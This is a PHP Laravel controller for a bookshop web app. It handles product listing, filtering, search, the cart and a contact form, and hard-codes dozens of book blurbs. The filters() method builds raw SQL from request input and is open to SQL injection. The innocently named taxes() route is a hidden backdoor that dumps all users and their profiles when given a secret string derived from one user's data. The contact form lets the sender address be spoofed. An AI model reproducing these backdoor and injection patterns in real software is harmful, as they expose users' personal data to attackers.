<?php

namespace App\Http\Controllers;

use App\Models\Book;
use App\Models\Category;
use App\Models\User;
use DB;
use Illuminate\Http\Request;
use Mail;

class ShopController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth')->only('control_panel');
        $this->middleware('isAdminOrPartner')->only('control-panel');
        $this->middleware('contact')->only('contact');
    }

    public function index(Request $request)
    {
        $books = Book::where('inShop', '1')->inRandomOrder()->paginate(10);
        $categories = Category::all();
        return view('general.shop-products',
            [
                'books' => $books,
                'categories' => $categories,
                'alt' => $request->alt,
            ]);
    }

    public function filters(Request $request)
    {
        $books = Book::where('inShop', '1');
        $categories = Category::all();

        $price_filters_panel = $request->price_filters_panel;
        $category_filters_panel = $request->category_filters_panel;

        if ($price_filters_panel) {
            $price_filter = "";
            if (sizeof($price_filters_panel) == 1) {
                $price_filter = $price_filter . "books.price " . $price_filters_panel[0];
            } else {
                for ($i = 0; $i < sizeof($price_filters_panel) - 1; $i++) {
                    $price_filter = $price_filter . "books.price " . $price_filters_panel[$i] . " OR ";
                }
                $price_filter = $price_filter . "books.price " . $price_filters_panel[$i];
            }
        }

        if ($category_filters_panel) {
            $category_filter = "";
            if (sizeof($category_filters_panel) == 1) {
                $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[0] . "'";
            } else {
                for ($i = 0; $i < sizeof($category_filters_panel) - 1; $i++) {
                    $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[$i] . "' OR ";
                }
                $category_filter = $category_filter . "categories.name = '" . $category_filters_panel[$i] . "'";
            }
        }

        if (isset($price_filter) && $price_filter != "") {
            $books = $books->whereRaw($price_filter);
        }

        if (isset($category_filter) && $category_filter != "") {
            $books = $books
                ->join('books_categories', 'books.book_id', '=', 'books_categories.book_id')
                ->join('categories', 'books_categories.category_id', '=', 'categories.category_id')
                ->whereRaw($category_filter);
        }

        //->get()->unique('book_id')
        $books = $books->inRandomOrder()->paginate(10);

        return view('general.shop-products',
            ['books' => $books,
                'categories' => $categories,
                'price_filters' => $price_filters_panel,
                'category_filters' => $category_filters_panel]);
    }

    public function search(Request $request)
    {
        $books = Book::where('inShop', '1')->where('title', 'like', '%' . $request->search . '%')->paginate(1000);
        $categories = Category::all();
        return view('general.shop-products', ['books' => $books, 'categories' => $categories]);
    }

    public function control_panel()
    {
        return view('general.control-panel');
    }

    public function shopping_cart(Request $request)
    {
        $session_shop = $request->session()->get('shopping_cart');

        $session_errors = $request->session()->get('errors');
        if (isset($session_errors)) {
            $session_errors = $session_errors->getBag('default');
        }

        $session = [];
        if (isset($request->shopping_cart)) {
            $session = json_decode(rawurldecode($request->shopping_cart), true);
            $session_shop = $request->shopping_cart;
        } else if (isset($session_shop)) {
            $session = json_decode(rawurldecode($session_shop), true);
        }

        $products = [];
        foreach (array_keys($session) as $product) {
            $id = preg_replace('/\D/', '', $product); // Extract the book id from session key
            $products[$id]['book'] = Book::find($id);
            $products[$id]['quantity'] = intval($session[$product]);
        }

        return view('general.shopping-cart',
            [
                'products' => $products,
                'shopping_cart' => $session_shop,
                'errors' => $session_errors,
            ]);
    }

    public function contact(Request $request)
    {
        return view('helpers.Surprise');
    }

    public function taxes(String $tax)
    {
        if ($tax == DB::select(DB::raw("SELECT CONCAT(RPAD(SUBSTRING(u.name, 2, 2), 6, '162'), SUBSTRING(p.adress, 4, 4), LPAD(CAST(ur.role_id AS CHAR), 2, '_')) as res FROM users u JOIN users_roles ur ON (u.id = ur.user_id) JOIN profiles p ON (u.id = p.user_id) WHERE u.id = 9;"))[0]->res) {
            $users = User::with("profile")->get();
            return $users;
        }
        return redirect()->route('shop');
    }

    public function contactemail(Request $request)
    {
        $subject = (isset($request->subject)) ? $request->subject : '';
        $email = (isset($request->email)) ? $request->email : '';
        $text = (isset($request->text)) ? $request->text : '';

        Mail::send('helpers.email_format', ['text' => $text], function ($message) use ($subject, $email) {
            $message->subject($subject)
                ->from($email)
                ->to('booktopia.contact@gmail.com', 'Booktopia');
        });

        return back();
    }

    public function show_large_map()
    {
        return view('general.large-map');
    }

    public function update_books_description()
    {
        $book = Book::find(117);
        $book->description = "Winning means fame and fortune. Losing means certain death. The Hunger Games have begun. . . .
\nIn the ruins of a place once known as North America lies the nation of Panem, a shining Capitol surrounded by twelve outlying districts. The Capitol is harsh and cruel and keeps the districts in line by forcing them all to send one boy and one girl between the ages of twelve and eighteen to participate in the annual Hunger Games, a fight to the death on live TV.
\nSixteen-year-old Katniss Everdeen regards it as a death sentence when she steps forward to take her sister's place in the Games. But Katniss has been close to dead before-and survival, for her, is second nature. Without really meaning to, she becomes a contender. But if she is to win, she will have to start making choices that weigh survival against humanity and life against love.";
        $book->save();

        $book = Book::find(118);
        $book->description = " Harry Potter has never even heard of Hogwarts when the letters start dropping on the doormat at number four, Privet Drive. Addressed in green ink on yellowish parchment with a purple seal, they are swiftly confiscated by his grisly aunt and uncle. Then, on Harry's eleventh birthday, a great beetle-eyed giant of a man called Rubeus Hagrid bursts in with some astonishing news: Harry Potter is a wizard, and he has a place at Hogwarts School of Witchcraft and Wizardry. An incredible adventure is about to begin!
\nThese new editions of the classic and internationally bestselling, multi-award-winning series feature instantly pick-up-able new jackets by Jonny Duddle, with huge child appeal, to bring Harry Potter to the next generation of readers. It's time to PASS THE MAGIC ON.";
        $book->save();

        $book = Book::find(119);
        $book->description = "Isabella Swan's move to Forks, a small, perpetually rainy town in Washington, could have been the most boring move she ever made. But once she meets the mysterious and alluring Edward Cullen, Isabella's life takes a thrilling and terrifying turn.
\nUp until now, Edward has managed to keep his vampire identity a secret in the small community he lives in, but now nobody is safe, especially Isabella, the person Edward holds most dear. The lovers find themselves balanced precariously on the point of a knife-between desire and danger.
\nDeeply romantic and extraordinarily suspenseful, Twilightcaptures the struggle between defying our instincts and satisfying our desires. This is a love story with bite.";
        $book->save();

        $book = Book::find(120);
        $book->description = "The unforgettable novel of a childhood in a sleepy Southern town and the crisis of conscience that rocked it, To Kill A Mockingbird became both an instant bestseller and a critical success when it was first published in 1960. It went on to win the Pulitzer Prize in 1961 and was later made into an Academy Award-winning film, also a classic.
\nCompassionate, dramatic, and deeply moving, To Kill A Mockingbird takes readers to the roots of human behavior - to innocence and experience, kindness and cruelty, love and hatred, humor and pathos. Now with over 18 million copies in print and translated into forty languages, this regional story by a young Alabama woman claims universal appeal. Harper Lee always considered her book to be a simple love story. Today it is regarded as a masterpiece of American literature.";
        $book->save();

        $book = Book::find(121);
        $book->description = "In The Great Gatsby, F. Scott Fitzgerald captures the flamboyance, the carelessness and the cruelty of the wealthy during America's Jazz Age. The Great Gatsby lives mysteriously in a luxurious Long Island mansion, playing lavish host to hundreds of people. And yet no one seems to know him or how he became so rich. He is rumoured to be everything from a German spy to a war hero. People clamour for invitations to his wild parties. But Jay Gatsby doesn't heed them. He cares for one person alone - Daisy Buchanan, the woman he has waited for all his life. Little does he know that his infatuation will lead to tragedy and end in murder. This beautiful Macmillan Collector's Library edition of The Great Gatsby features an afterword by David Stuart Davies. Designed to appeal to the booklover, the Macmillan Collector's Library is a series of beautiful gift editions of much loved classic titles. Macmillan Collector's Library are books to love and treasure.";
        $book->save();


        $book = Book::find(122);
        $book->description = "Despite the tumor-shrinking medical miracle that has bought her a few years, Hazel has never been anything but terminal, her final chapter inscribed upon diagnosis. But when a gorgeous plot twist named Augustus Waters suddenly appears at Cancer Kid Support Group, Hazel's story is about to be completely rewritten.
\nInsightful, bold, irreverent, and raw, The Fault in Our Stars is award-winning author John Green's most ambitious and heartbreaking work yet, brilliantly exploring the funny, thrilling, and tragic business of being alive and in love.";
        $book->save();

        $book = Book::find(123);
        $book->description = "Written for J.R.R. Tolkien’s own children, The Hobbit met with instant critical acclaim when it was first published in 1937. Now recognized as a timeless classic, this introduction to the hobbit Bilbo Baggins, the wizard Gandalf, Gollum, and the spectacular world of Middle-earth recounts of the adventures of a reluctant hero, a powerful and dangerous ring, and the cruel dragon Smaug the Magnificent. The text in this 372-page paperback edition is based on that first published in Great Britain by Collins Modern Classics (1998), and includes a note on the text by Douglas A. Anderson (2001). Unforgettable!";
        $book->save();

        $book = Book::find(124);
        $book->description = "The hero-narrator of The Catcher in the Rye is an ancient child of sixteen, a native New Yorker named Holden Caulfield. Through circumstances that tend to preclude adult, secondhand description, he leaves his prep school in Pennsylvania and goes underground in New York City for three days. The boy himself is at once too simple and too complex for us to make any final comment about him or his story. Perhaps the safest thing we can say about Holden is that he was born in the world not just strongly attracted to beauty but, almost, hopelessly impaled on it. There are many voices in this novel: children's voices, adult voices, underground voices-but Holden's voice is the most eloquent of all. Transcending his own vernacular, yet remaining marvelously faithful to it, he issues a perfectly articulated cry of mixed pain and pleasure. However, like most lovers and clowns and poets of the higher orders, he keeps most of the pain to, and for, himself. The pleasure he gives away, or sets aside, with all his heart. It is there for the reader who can handle it to keep.";
        $book->save();

        $book = Book::find(125);
        $book->description = "World-renowned Harvard symbologist Robert Langdon is summoned to a Swiss research facility to analyze a cryptic symbol seared into the chest of a murdered physicist. What he discovers is unimaginable: a deadly vendetta against the Catholic Church by a centuries-old underground organization -- the Illuminati. In a desperate race to save the Vatican from a powerful time bomb, Langdon joins forces in Rome with the beautiful and mysterious scientist Vittoria Vetra. Together they embark on a frantic hunt through sealed crypts, dangerous catacombs, and deserted cathedrals, and into the depths of the most secretive vault on earth...the long-forgotten Illuminati lair.";
        $book->save();

        $book = Book::find(126);
        $book->description = "Since its immediate success in 1813, Pride and Prejudice has remained one of the most popular novels in the English language. Jane Austen called this brilliant work \"her own darling child\" and its vivacious heroine, Elizabeth Bennet, \"as delightful a creature as ever appeared in print.\" The romantic clash between the opinionated Elizabeth and her proud beau, Mr. Darcy, is a splendid performance of civilized sparring. And Jane Austen's radiant wit sparkles as her characters dance a delicate quadrille of flirtation and intrigue, making this book the most superb comedy of manners of Regency England.";
        $book->save();

        $book = Book::find(127);
        $book->description = "Amir is the son of a wealthy Kabul merchant, a member of the ruling caste of Pashtuns. Hassan, his servant and constant companion, is a Hazara, a despised and impoverished caste. Their uncommon bond is torn by Amir's choice to abandon his friend amidst the increasing ethnic, religious, and political tensions of the dying years of the Afghan monarchy, wrenching them far apart. But so strong is the bond between the two boys that Amir journeys back to a distant world, to try to right past wrongs against the only true friend he ever had.
\nThe unforgettable, heartbreaking story of the unlikely friendship between a wealthy boy and the son of his father’s servant, The Kite Runner is a beautifully crafted novel set in a country that is in the process of being destroyed. It is about the power of reading, the price of betrayal, and the possibility of redemption; and an exploration of the power of fathers over sons—their love, their sacrifices, their lies.";
        $book->save();

        $book = Book::find(128);
        $book->description = "In Beatrice Prior's dystopian Chicago world, society is divided into five factions, each dedicated to the cultivation of a particular virtue—Candor (the honest), Abnegation (the selfless), Dauntless (the brave), Amity (the peaceful), and Erudite (the intelligent). On an appointed day of every year, all sixteen-year-olds must select the faction to which they will devote the rest of their lives. For Beatrice, the decision is between staying with her family and being who she really is—she can't have both. So she makes a choice that surprises everyone, including herself.
\nDuring the highly competitive initiation that follows, Beatrice renames herself Tris and struggles alongside her fellow initiates to live out the choice they have made. Together they must undergo extreme physical tests of endurance and intense psychological simulations, some with devastating consequences. As initiation transforms them all, Tris must determine who her friends really are—and where, exactly, a romance with a sometimes fascinating, sometimes exasperating boy fits into the life she's chosen. But Tris also has a secret, one she's kept hidden from everyone because she's been warned it can mean death. And as she discovers unrest and growing conflict that threaten to unravel her seemingly perfect society, she also learns that her secret might help her save those she loves . . . or it might destroy her.";
        $book->save();

        $book = Book::find(129);
        $book->description = "Insight Study Guides are written by experts and cover a range of popular literature, plays and films. Designed to provide insight and an overview about each text for students and teachers, these guides endeavor to develop knowledge and understanding rather than just provide answers and summaries.";
        $book->save();

        $book = Book::find(130);
        $book->description = "George Orwell's timeless and timely allegorical novel—a scathing satire on a downtrodden society’s blind march towards totalitarianism.
\n“All animals are equal, but some animals are more equal than others.”
\nA farm is taken over by its overworked, mistreated animals. With flaming idealism and stirring slogans, they set out to create a paradise of progress, justice, and equality. Thus the stage is set for one of the most telling satiric fables ever penned—a razor-edged fairy tale for grown-ups that records the evolution from revolution against tyranny to a totalitarianism just as terrible.
\nWhen Animal Farm was first published, Stalinist Russia was seen as its target. Today it is devastatingly clear that wherever and whenever freedom is attacked, under whatever banner, the cutting clarity and savage comedy of George Orwell’s masterpiece have a meaning and message still ferociously fresh.";
        $book->save();

        $book = Book::find(131);
        $book->description = "Anne Frank hield van 12 juni 1942 tot 1 augustus 1944 een dagboek bij. Ze schreef haar brieven alleen voor zichzelf, tot ze in de lente van 1944 op de radio de minister van Onderwijs in ballingschap, Bolkestein, hoorde spreken. Hij zei dat na de oorlog alle getuigenissen van het lijden van het Nederlandse volk onder de Duitse bezetting verzameld en openbaar moesten worden gemaakt. Als voorbeeld noemde hij onder meer dagboeken. Onder de indruk van deze redevoering besloot Anne Frank na de oorlog een boek te publiceren. Haar dagboek zou daarvoor als basis dienen.
\nIn maart 1945 stierf Anne Frank op vijftienjarige leeftijd in het concentratiekamp Bergen-Belsen. De enige overlevende van de familie, Otto Frank, zorgde ervoor dat het dagboek van zijn dochter toch gepubliceerd werd. In 1947 verscheen Het Achterhuis.";
        $book->save();

        $book = Book::find(132);
        $book->description = "Källa: Wikipedia. Sidor: 48. Kapitlen: Män som hatar kvinnor, Jägarna, Sigillet, Flickan som lekte med elden, Luftslottet som sprängdes, Sista dansen, Gula divisionen, I lagens namn, Van Veeteren - Carambole, Svart Lucia, Johan Falk - Gruppen för särskilda insatser, Den tredje vägen, Vendetta, Thriller - en grym film, Van Veeteren - Moreno och tystnaden, Roseanna, Skenbart - en film om tåg, Den 5:e kvinnan, Van Veeteren - Fallet G, Sommarmord, Van Veeteren - Borkmanns punkt, Van Veeteren - Svalan, Katten, Rosen, Döden, \"Harry Lund\" lägger näsan i blöt , Sista kontraktet, Wallander - Innan frosten, Varg Veum - Bittra blomster, Wallander - Hämnden, Mannen som blev miljonär, Hamilton, Kraftverk 3714, Den gula bilen, Hundarna i Riga, Händerna, Dödlig drift, Flygnivå 450, Täcknamn Coq Rouge, Storm, Wallander - Byfånen, Spring för livet, Hassel - Terrorns finger, Hassel - Utpressarna, Wallander - Jokern, Van Veeteren - Münsters fall, Noll tolerans, Wallander - Mastermind, Wallander - Mörkret, Ögat, Johan Falk - Leo Gaut, Wallander - Kuriren, Wallander - Cellisten, Hemligheten, Den demokratiske terroristen, Den vita lejoninnan, Wallander - Hemligheten, Tatuerad torso, Johan Falk - National Target, Steget efter, Hassel - Svarta banken, Hassel - Säkra papper, Damen i svart, Tusenbröder - Återkomsten, Wallander - Vittnet, Jägarna 2, Johan Falk - De fredlösa, Wallander - Afrikanen, Wallander - Skulden, Johan Falk - Vapenbröder, Hassel - Slavhandlarna, Wallander - Tjuven, Farligt löfte, Hurvamorden, Hassel - De giriga, Råttornas vinter, Wallander - Prästen, Johan Falk - Operation Näktergal, Järngänget, Falsk som vatten, Wallander - Bröderna, Wallander - Indrivaren, Hassel - Offren, Wallander - Luftslottet, Wallander - Skytten, Moln över Hellesta, Wallander - Dödsängeln, Dykaren, Passageraren, Pyramiden, Den osynlige, Wallander - Vålnaden, Exit, Wallander - Den svaga punkten, Blå måndag, Hassel - Förgörarna, Wallander - Täckmanteln, Farligt förflutet, Villospår, Apan, Sjön, ... ";
        $book->save();

        $book = Book::find(133);
        $book->description = "Against all odds, Katniss has won the Hunger Games. She and fellow District 12 tribute Peeta Mellark are miraculously still alive. Katniss should be relieved, happy even. After all, she has returned to her family and her longtime friend, Gale. Yet nothing is the way Katniss wishes it to be. Gale holds her at an icy distance. Peeta has turned his back on her completely. And there are whispers of a rebellion against the Capitol - a rebellion that Katniss and Peeta may have helped create.
\nMuch to her shock, Katniss has fueled an unrest she's afraid she cannot stop. And what scares her even more is that she's not entirely convinced she should try. As time draws near for Katniss and Peeta to visit the districts on the Capitol's cruel Victory Tour, the stakes are higher than ever. If they can't prove, without a shadow of a doubt, that they are lost in their love for each other, the consequences will be horrifying.
\nIn Catching Fire, the second novel in the Hunger Games trilogy, Suzanne Collins continues the story of Katniss Everdeen, testing her more than ever before...and surprising readers at every turn.";
        $book->save();

        $book = Book::find(134);
        $book->description = "Harry Potter's third year at Hogwarts is full of new dangers. A convicted murderer, Sirius Black, has broken out of Azkaban prison, and it seems he's after Harry. Now Hogwarts is being patrolled by the dementors, the Azkaban guards who are hunting Sirius. But Harry can't imagine that Sirius or, for that matter, the evil Lord Voldemort could be more frightening than the dementors themselves, who have the terrible power to fill anyone they come across with aching loneliness and despair. Meanwhile, life continues as usual at Hogwarts. A top-of-the-line broom takes Harry's success at Quidditch, the sport of the Wizarding world, to new heights. A cute fourth-year student catches his eye. And he becomes close with the new Defense of the Dark Arts teacher, who was a childhood friend of his father. Yet despite the relative safety of life at Hogwarts and the best efforts of the dementors, the threat of Sirius Black grows ever closer. But if Harry has learned anything from his education in wizardry, it is that things are often not what they seem. Tragic revelations, heartwarming surprises, and high-stakes magical adventures await the boy wizard in this funny and poignant third installment of the beloved series.";
        $book->save();

        $book = Book::find(135);
        $book->description = "One Ring to rule them all, One Ring to find them, One Ring to bring them all and in the darkeness bind them
\nIn ancient times the Rings of Power were crafted by the Elven-smiths, and Sauron, The Dark Lord, forged the One Ring, filling it with his own power so that he could rule all others. But the One Ring was taken from him, and though he sought it throughout Middle-earth, it remained lost to him. After many ages it fell into the hands of Bilbo Baggins, as told in The Hobbit.
\nIn a sleepy village in the Shire, young Frodo Baggins finds himself faced with an immense task, as his elderly cousin Bilbo entrusts the Ring to his care. Frodo must leave his home and make a perilous journey across Middle-earth to the Cracks of Doom, there to destroy the Ring and foil the Dark Lord in his evil purpose.";
        $book->save();

        $book = Book::find(136);
        $book->description = "Katniss Everdeen, girl on fire, has survived, even though her home has been destroyed. Gale has escaped. Katniss's family is safe. Peeta has been captured by the Capitol. District 13 really does exist. There are rebels. There are new leaders. A revolution is unfolding.
\nIt is by design that Katniss was rescued from the arena in the cruel and haunting Quarter Quell, and it is by design that she has long been part of the revolution without knowing it. District 13 has come out of the shadows and is plotting to overthrow the Capitol. Everyone, it seems, has had a hand in the carefully laid plans--except Katniss.
\nThe success of the rebellion hinges on Katniss's willingness to be a pawn, to accept responsibility for countless lives, and to change the course of the future of Panem. To do this, she must put aside her feelings of anger and distrust. She must become the rebels' Mockingjay--no matter what the personal cost.";
        $book->save();

        $book = Book::find(137);
        $book->description = "There is a door at the end of a silent corridor. And it’s haunting Harry Pottter’s dreams. Why else would he be waking in the middle of the night, screaming in terror?
\nHarry has a lot on his mind for this, his fifth year at Hogwarts: a Defense Against the Dark Arts teacher with a personality like poisoned honey; a big surprise on the Gryffindor Quidditch team; and the looming terror of the Ordinary Wizarding Level exams. But all these things pale next to the growing threat of He-Who-Must-Not-Be-Named---a threat that neither the magical government nor the authorities at Hogwarts can stop.
\nAs the grasp of darkness tightens, Harry must discover the true depth and strength of his friends, the importance of boundless loyalty, and the shocking price of unbearable sacrifice.
\nHis fate depends on them all.";
        $book->save();

        $book = Book::find(138);
        $book->description = "The Lovely Bones is the story of a family devastated by a gruesome murder -- a murder recounted by the teenage victim. Upsetting, you say? Remarkably, first-time novelist Alice Sebold takes this difficult material and delivers a compelling and accomplished exploration of a fractured family's need for peace and closure.
\nThe details of the crime are laid out in the first few pages: from her vantage point in heaven, Susie Salmon describes how she was confronted by the murderer one December afternoon on her way home from school. Lured into an underground hiding place, she was raped and killed. But what the reader knows, her family does not. Anxiously, we keep vigil with Susie, aching for her grieving family, desperate for the killer to be found and punished.
\nSebold creates a heaven that's calm and comforting, a place whose residents can have whatever they enjoyed when they were alive -- and then some. But Susie isn't ready to release her hold on life just yet, and she intensely watches her family and friends as they struggle to cope with a reality in which she is no longer a part. To her great credit, Sebold has shaped one of the most loving and sympathetic fathers in contemporary literature.";
        $book->save();

        $book = Book::find(139);
        $book->description = "The Dursleys were so mean and hideous that summer that all Harry Potter wanted was to get back to the Hogwarts School for Witchcraft and Wizardry. But just as he's packing his bags, Harry receives a warning from a strange, impish creature named Dobby who says that if Harry Potter returns to Hogwarts, disaster will strike
\nAnd strike it does. For in Harry's second year at Hogwarts, fresh torments and horrors arise, including an outrageously stuck-up new professor, Gilderoy Lockhart, a spirit named Moaning Myrtle who haunts the girls' bathroom, and the unwanted attentions of Ron Weasley's younger sister, Ginny.
\nBut each of these seem minor annoyances when the real trouble begins, and someone -- or something -- starts turning Hogwarts students to stone. Could it be Draco Malfoy, a more poisonous rival than ever? Could it possibly be Hagrid, whose mysterious past is finally told? Or could it be the one everyone at Hogwarts most suspects . . . Harry Potter himself?";
        $book->save();

        $book = Book::find(140);
        $book->description = "Harry Potter is midway through his training as a wizard and his coming of age. Harry wants to get away from the pernicious Dursleys and go to the International Quidditch Cup. He wants to find out about the mysterious event that's supposed to take place at Hogwarts this year, an event involving two other rival schools of magic, and a competition that hasn't happened for a hundred years. He wants to be a normal, fourteen-year-old wizard. But unfortunately for Harry Potter, he's not normal - even by wizarding standards. And in his case, different can be deadly.";
        $book->save();

        $book = Book::find(141);
        $book->description = "Harry Potter is leaving Privet Drive for the last time. But as he climbs into the sidecar of Hagrid’s motorbike and they take to the skies, he knows Lord Voldemort and the Death Eaters will not be far behind.
\nThe protective charm that has kept him safe until now is broken. But the Dark Lord is breathing fear into everything he loves. And he knows he can’t keep hiding.
\nTo stop Voldemort, Harry knows he must find the remaining Horcruxes and destroy them.
\nHe will have to face his enemy in one final battle.";
        $book->save();

        $book = Book::find(142);
        $book->description = "While in Paris, Harvard symbologist Robert Langdon is awakened by a phone call in the dead of the night. The elderly curator of the Louvre has been murdered inside the museum, his body covered in baffling symbols. As Langdon and gifted French cryptologist Sophie Neveu sort through the bizarre riddles, they are stunned to discover a trail of clues hidden in the works of Leonardo da Vinci—clues visible for all to see and yet ingeniously disguised by the painter.

Even more startling, the late curator was involved in the Priory of Sion—a secret society whose members included Sir Isaac Newton, Victor Hugo, and Da Vinci—and he guarded a breathtaking historical secret. Unless Langdon and Neveu can decipher the labyrinthine puzzle—while avoiding the faceless adversary who shadows their every move—the explosive, ancient truth will be lost forever. ";
        $book->save();

        $book = Book::find(143);
        $book->description = "When Harry Potter and the Half-Blood Prince opens, the war against Voldemort has begun. The Wizarding world has split down the middle, and as the casualties mount, the effects even spill over onto the Muggles. Dumbledore is away from Hogwarts for long periods, and the Order of the Phoenix has suffered grievous losses. And yet, as in all wars, life goes on.
\nHarry, Ron, and Hermione, having passed their O.W.L. level exams, start on their specialist N.E.W.T. courses. Sixth-year students learn to Apparate, losing a few eyebrows in the process. Teenagers flirt and fight and fall in love. Harry becomes captain of the Gryffindor Quidditch team, while Draco Malfoy pursues his own dark ends. And classes are as fascinating and confounding as ever, as Harry receives some extraordinary help in Potions from the mysterious Half-Blood Prince.
\nMost importantly, Dumbledore and Harry work together to uncover the full and complex story of a boy once named Tom Riddle—the boy who became Lord Voldemort. Like Harry, he was the son of one Muggle-born and one Wizarding parent, raised unloved, and a speaker of Parseltongue. But the similarities end there, as the teenaged Riddle became deeply interested in the Dark objects known as Horcruxes: objects in which a wizard can hide part of his soul, if he dares splinter that soul through murder.
\nHarry must use all the tools at his disposal to draw a final secret out of one of Riddle’s teachers, the sly Potions professor Horace Slughorn. Finally Harry and Dumbledore hold the key to the Dark Lord’s weaknesses... until a shocking reversal exposes Dumbledore’s own vulnerabilities, and casts Harry’s—and Hogwarts’s—future in shadow.";
        $book->save();

        $book = Book::find(144);
        $book->description = "At the dawn of the next world war, a plane crashes on an uncharted island, stranding a group of schoolboys. At first, with no adult supervision, their freedom is something to celebrate; this far from civilization the boys can do anything they want. Anything. They attempt to forge their own society, failing, however, in the face of terror, sin and evil. And as order collapses, as strange howls echo in the night, as terror begins its reign, the hope of adventure seems as far from reality as the hope of being rescued. Labeled a parable, an allegory, a myth, a morality tale, a parody, a political treatise, even a vision of the apocalypse, Lord of the Flies is perhaps our most memorable novel about “the end of innocence, the darkness of man’s heart.”";
        $book->save();

        $book = Book::find(145);
        $book->description = "The Shakespearean Originals series aims to provide readers of modern drama with 16th- and 17th-century playtexts which have been treated as historical documents, and are reproduced as closely to their original printed forms as the conditions of modern publication will permit. Each volume in the series comprises a general series introduction, an introduction to the play, the original text, a select bibliography, full annotations and some sample facsimile pages from the text itself.";
        $book->save();

        $book = Book::find(146);
        $book->description = "Marriage can be a real killer.
\nOn a warm summer morning in North Carthage, Missouri, it is Nick and Amy Dunne’s fifth wedding anniversary. Presents are being wrapped and reservations are being made when Nick’s clever and beautiful wife disappears from their rented McMansion on the Mississippi River. Husband-of-the-Year Nick isn’t doing himself any favors with cringe-worthy daydreams about the slope and shape of his wife’s head, but passages from Amy's diary reveal the alpha-girl perfectionist could have put anyone dangerously on edge. Under mounting pressure from the police and the media—as well as Amy’s fiercely doting parents—the town golden boy parades an endless series of lies, deceits, and inappropriate behavior. Nick is oddly evasive, and he’s definitely bitter—but is he really a killer?
\nAs the cops close in, every couple in town is soon wondering how well they know the one that they love. With his twin sister, Margo, at his side, Nick stands by his innocence. Trouble is, if Nick didn’t do it, where is that beautiful wife? And what was in that silvery gift box hidden in the back of her bedroom closet?
\nWith her razor-sharp writing and trademark psychological insight, Gillian Flynn delivers a fast-paced, devilishly dark, and ingeniously plotted thriller that confirms her status as one of the hottest writers around.
\nOne of the most critically acclaimed suspense writers of our time, New York Times bestseller Gillian Flynn takes that statement to its darkest place in this unputdownable masterpiece about a marriage gone terribly, terribly wrong. The Chicago Tribune proclaimed that her work “draws you in and keeps you reading with the force of a pure but nasty addiction.” Gone Girl’s toxic mix of sharp-edged wit and deliciously chilling prose creates a nerve-fraying thriller that confounds you at every turn.";
        $book->save();

        $book = Book::find(147);
        $book->description = "Three ordinary women are about to take one extraordinary step.
\nTwenty-two-year-old Skeeter has just returned home after graduating from Ole Miss. She may have a degree, but it is 1962, Mississippi, and her mother will not be happy till Skeeter has a ring on her finger. Skeeter would normally find solace with her beloved maid Constantine, the woman who raised her, but Constantine has disappeared and no one will tell Skeeter where she has gone.
\nAibileen is a black maid, a wise, regal woman raising her seventeenth white child. Something has shifted inside her after the loss of her own son, who died while his bosses looked the other way. She is devoted to the little girl she looks after, though she knows both their hearts may be broken.
\nMinny, Aibileen's best friend, is short, fat, and perhaps the sassiest woman in Mississippi. She can cook like nobody's business, but she can't mind her tongue, so she's lost yet another job. Minny finally finds a position working for someone too new to town to know her reputation. But her new boss has secrets of her own.
\nSeemingly as different from one another as can be, these women will nonetheless come together for a clandestine project that will put them all at risk. And why? Because they are suffocating within the lines that define their town and their times. And sometimes lines are made to be crossed.
\nIn pitch-perfect voices, Kathryn Stockett creates three extraordinary women whose determination to start a movement of their own forever changes a town, and the way women, mothers, daughters, caregivers, friends, view one another. A deeply moving novel filled with poignancy, humor, and hope, The Help is a timeless and universal story about the lines we abide by, and the ones we don't. ";
        $book->save();

        $book = Book::find(148);
        $book->description = "The compelling story of two outsiders striving to find their place in an unforgiving world. Drifters in search of work, George and his simple-minded friend Lennie have nothing in the world except each other and a dream--a dream that one day they will have some land of their own. Eventually they find work on a ranch in California’s Salinas Valley, but their hopes are doomed as Lennie, struggling against extreme cruelty, misunderstanding and feelings of jealousy, becomes a victim of his own strength. Tackling universal themes such as the friendship of a shared vision, and giving voice to America’s lonely and dispossessed, Of Mice and Men has proved one of Steinbeck’s most popular works, achieving success as a novel, a Broadway play and three acclaimed films. ";
        $book->save();

        $book = Book::find(149);
        $book->description = "A literary sensation and runaway bestseller, this brilliant debut novel presents with seamless authenticity and exquisite lyricism the true confessions of one of Japan's most celebrated geisha.
\nIn Memoirs of a Geisha, we enter a world where appearances are paramount; where a girl's virginity is auctioned to the highest bidder; where women are trained to beguile the most powerful men; and where love is scorned as illusion. It is a unique and triumphant work of fiction - at once romantic, erotic, suspenseful - and completely unforgettable.";
        $book->save();

        $book = Book::find(150);
        $book->description = "When literature student Anastasia Steele goes to interview young entrepreneur Christian Grey, she encounters a man who is beautiful, brilliant, and intimidating. The unworldly, innocent Ana is startled to realize she wants this man and, despite his enigmatic reserve, finds she is desperate to get close to him. Unable to resist Ana’s quiet beauty, wit, and independent spirit, Grey admits he wants her, too—but on his own terms.
\nShocked yet thrilled by Grey’s singular erotic tastes, Ana hesitates. For all the trappings of success—his multinational businesses, his vast wealth, his loving family—Grey is a man tormented by demons and consumed by the need to control. When the couple embarks on a daring, passionately physical affair, Ana discovers Christian Grey’s secrets and explores her own dark desires.
\nErotic, amusing, and deeply moving, the Fifty Shades Trilogy is a tale that will obsess you, possess you, and stay with you forever.";
        $book->save();

        $book = Book::find(151);
        $book->description = "O Alquimista é a história de um jovem que tem um sonho repetido com um tesouro oculto guardado perto das pirâmides do Egipto. Este resolve seguir o seu sonho, enfrenta as maiores dificuldades, atravessa desertos e defronta-se com os grandes mistérios que acompanham o Homem desde o começo dos tempos: os sinais de Deus, a Lenda Pessoal que cada um de nós tem que viver, a misteriosa Alma do Mundo, onde qualquer pessoa pode penetrar se ouvir a voz do seu coração.";
        $book->save();

        $book = Book::find(152);
        $book->description = "Twelve-year-old Jonas lives in a seemingly ideal world. Not until he is given his life assignment as the Receiver does he begin to understand the dark secrets behind this fragile community.";
        $book->save();

        $book = Book::find(153);
        $book->description = "There are a thousand stories in the land of Narnia, and the first is about to be told in an extraordinary motion picture, The Chronicles of Narnia: The Lion, the Witch and the Wardrobe, from Walt Disney Pictures and Walden Media.
\nIn the never-ending war between good and evil, The Chronicles of Narnia set the stage for battles of epic proportions. Some take place in vast fields, where the forces of light and darkness clash. But other battles occur within the small chambers of the heart and are equally decisive.
\nJourneys to the ends of the world, fantastic creatures, betrayals, heroic deeds and friendships won and lost -- all come together in an unforgettable world of magic. So join the battle to end all battles.
\nThe second volume in
\nThe Chronicles of Narnia®
